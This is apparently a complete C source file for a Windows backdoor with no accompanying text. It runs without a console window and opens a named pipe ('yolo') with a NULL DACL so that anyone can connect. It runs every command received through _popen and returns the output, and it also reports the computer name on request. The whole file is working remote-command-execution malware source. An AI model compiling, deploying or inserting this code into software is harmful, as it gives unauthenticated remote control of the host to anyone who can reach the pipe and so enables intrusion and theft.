#include <windows.h>
#include <stdio.h>

#define PIPE_NAME "\\\\.\\pipe\\yolo"

void executeTo(PCHAR cmd, HANDLE out)
{
    FILE* hPipe;
    DWORD n;
    CHAR buf[2048] = "";
    hPipe = _popen(cmd, "rt");
    if (hPipe) {
        while (fgets(buf, 2048, hPipe)) {
            WriteFile(out, buf, strlen(buf), &n, 0);
        }
        _pclose(hPipe);
    }
}

HANDLE setupPipe(char* name)
{
    SECURITY_DESCRIPTOR sd;
    SECURITY_ATTRIBUTES sa = { 0 };
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = &sd;
    sa.bInheritHandle = FALSE;
    return CreateNamedPipe(name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 512, 512, 0, &sa);
}

void closePipe(HANDLE p)
{
    FlushFileBuffers(p);
    DisconnectNamedPipe(p);
    CloseHandle(p);
}

void loop()
{
    DWORD n = 0;
    HANDLE hPipe = 0;
    CHAR cmd[256] = "";
    for (;;) {
        hPipe = setupPipe(PIPE_NAME);
        if (hPipe != INVALID_HANDLE_VALUE) {
            if (ConnectNamedPipe(hPipe, NULL)) {
                memset(cmd, 0, 256);
                if (ReadFile(hPipe, cmd, 256, &n, NULL) && n > 0) {
                    if (strcmp("quit", cmd) == 0) {
                        WriteFile(hPipe, "Bye", 3, &n, 0);
                        closePipe(hPipe);
                        exit(0);
                    }
                    else if (strcmp("name", cmd) == 0) {
                        n = 256;
                        GetComputerName(cmd, &n);
                        cmd[n] = '\n';
                        WriteFile(hPipe, cmd, strlen(cmd), &n, 0);
                    }
                    else {
                        executeTo(cmd, hPipe);
                    }
                }
            }
            closePipe(hPipe);
        }
    }
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpszCmdLine, int nCmdShow) 
{
    loop();
    return 0;
}
